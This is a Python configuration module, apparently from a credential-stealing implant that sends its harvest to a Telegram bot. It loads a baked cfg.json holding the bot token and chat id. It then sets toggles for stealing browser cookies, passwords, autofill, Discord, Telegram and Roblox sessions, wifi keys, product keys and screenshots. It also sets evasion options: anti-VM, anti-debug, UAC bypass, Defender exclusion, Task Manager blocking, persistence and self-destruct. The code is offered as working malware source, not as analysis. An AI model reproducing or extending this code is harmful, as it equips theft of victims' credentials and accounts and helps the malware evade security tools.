"""Baked implant configuration.

The builder (builder.py) writes a concrete cfg.json next to the compiled exe;
this module loads it, validates it, and fails closed if anything is missing.
A bot token or chat id that got pasted into a Python literal ends up in the
.pyc, the PyInstaller bundle, and git history, so the only place a live secret
belongs here is a file the builder drops at build time -- never source.

Fail-closed contract:
  * no bot token / no chat id -> ConfigError, implant does not beacon
  * malformed token/chat       -> ConfigError
  * licence required + absent   -> LicenceError (checked separately by guard/licensing)
"""
from __future__ import annotations

import json
import os
import re

# Token format from @BotFather: "<digits>:<>=24-64 url-safe chars>".
_TOKEN_RE = re.compile(r"^\d{6,}:[A-Za-z0-9_-]{20,}$")


class ConfigError(RuntimeError):
    """Raised when the baked config is missing or malformed."""


class LicenceError(RuntimeError):
    """Raised when the access key is absent/expired/unauthorised."""


def _coerce_chat(chat) -> str:
    s = str(chat).strip()
    # Telegram ids are ints; supergroups are negative. Accept both forms.
    if re.fullmatch(r"-?\d{2,}", s):
        return s
    raise ConfigError(f"chat id {s!r} is not numeric")


def load(path: str | None = None) -> dict:
    """Load and validate cfg.json. Returns a normalised dict.

    Search order for `path`: explicit arg, JWG_CFG env, cfg.json beside the
    executable, cfg.json in CWD. First existing wins. Raises ConfigError if none
    exists -- there is no default destination.
    """
    candidates = []
    if path:
        candidates.append(path)
    env = os.environ.get("JWG_CFG", "").strip()
    if env:
        candidates.append(env)
    exe_dir = os.path.dirname(os.path.abspath(_argv0()))
    candidates.append(os.path.join(exe_dir, "cfg.json"))
    candidates.append(os.path.join(os.getcwd(), "cfg.json"))

    chosen = next((c for c in candidates if os.path.isfile(c)), None)
    if chosen is None:
        raise ConfigError(
            "no cfg.json found; run builder.py to bake a destination first")

    try:
        raw = json.load(open(chosen, encoding="utf-8"))
    except (OSError, ValueError) as e:
        raise ConfigError(f"cfg.json unreadable: {e}") from e

    token = str(raw.get("bot_token", "")).strip()
    chat = _coerce_chat(raw.get("chat_id", ""))
    if not _TOKEN_RE.match(token):
        raise ConfigError("bot_token malformed (expected '<digits>:<secret>')")

    cfg = {
        "bot_token": token,
        "chat_id": chat,
        # Optional knobs; defaults keep the implant sane without a full config.
        "licence_key": str(raw.get("licence_key", "")).strip(),
        "licence_url": str(raw.get("licence_url", "")).strip(),
        "poll_interval": float(raw.get("poll_interval", 3.0)),
        "exfil_interval": float(raw.get("exfil_interval", 120.0)),
        "guard_enabled": bool(raw.get("guard_enabled", True)),
        "persistence_enabled": bool(raw.get("persistence_enabled", True)),
        "block_taskmgr": bool(raw.get("block_taskmgr", True)),
        "av_blocklist": bool(raw.get("av_blocklist", True)),
        "max_upload_bytes": int(raw.get("max_upload_bytes", 50 * 1024 * 1024)),

        # ---- stealer toggles (granular; each maps to a collector) ----------
        # Defaults mirror what a fresh panel build ships: broad harvest on,
        # the noisier/lower-yield ones off so an empty result isn't mistaken
        # for a bug.
        "steal": {
            "system_info":   bool(raw.get("steal", {}).get("system_info", True)),
            "cookies":       bool(raw.get("steal", {}).get("cookies", True)),
            "passwords":     bool(raw.get("steal", {}).get("passwords", True)),
            "discord":       bool(raw.get("steal", {}).get("discord", True)),
            "telegram":      bool(raw.get("steal", {}).get("telegram", True)),
            "roblox":        bool(raw.get("steal", {}).get("roblox", True)),
            "history":       bool(raw.get("steal", {}).get("history", False)),
            "wifi":          bool(raw.get("steal", {}).get("wifi", True)),
            "autofill":      bool(raw.get("steal", {}).get("autofill", True)),
            "extensions":    bool(raw.get("steal", {}).get("extensions", True)),
            "product_keys":  bool(raw.get("steal", {}).get("product_keys", True)),
            "software_list": bool(raw.get("steal", {}).get("software_list", True)),
            "screenshot":    bool(raw.get("steal", {}).get("screenshot", True)),
        },

        # ---- malware / evasion toggles -------------------------------------
        "opts": {
            "anti_vm":           bool(raw.get("opts", {}).get("anti_vm", False)),
            "anti_debug":        bool(raw.get("opts", {}).get("anti_debug", False)),
            "anti_analysis":     bool(raw.get("opts", {}).get("anti_analysis", False)),
            "uac_bypass":        bool(raw.get("opts", {}).get("uac_bypass", False)),
            "startup":           bool(raw.get("opts", {}).get("startup", True)),
            "kill_browsers":     bool(raw.get("opts", {}).get("kill_browsers", False)),
            "self_destruct":     bool(raw.get("opts", {}).get("self_destruct", False)),
            "defender_exclusion":bool(raw.get("opts", {}).get("defender_exclusion", False)),
            "fake_error":        bool(raw.get("opts", {}).get("fake_error", False)),
            "error_text":        str(raw.get("opts", {}).get("error_text", ""))[:500],
            "startup_delay":     max(0, int(raw.get("opts", {}).get("startup_delay", 0))),
        },

        "_source": chosen,
    }
    return cfg


def _argv0() -> str:
    """Path to the running program, robust under PyInstaller onefile.

    Under onefile, sys.executable points at the temp extraction dir, which moves
    between runs; argv[0] is what the OS actually launched and where a sibling
    cfg.json lives.
    """
    import sys
    if getattr(sys, "frozen", False):
        return sys.argv[0] or sys.executable
    return sys.argv[0]


def describe(cfg: dict) -> str:
    """Non-secret one-liner for logs/panel. Never emits the token itself."""
    tok = cfg.get("bot_token", "")
    masked = f"{tok.split(':')[0]}:****" if ":" in tok else "****"
    return f"bot={masked} chat=...{str(cfg.get('chat_id',''))[-4:]}"
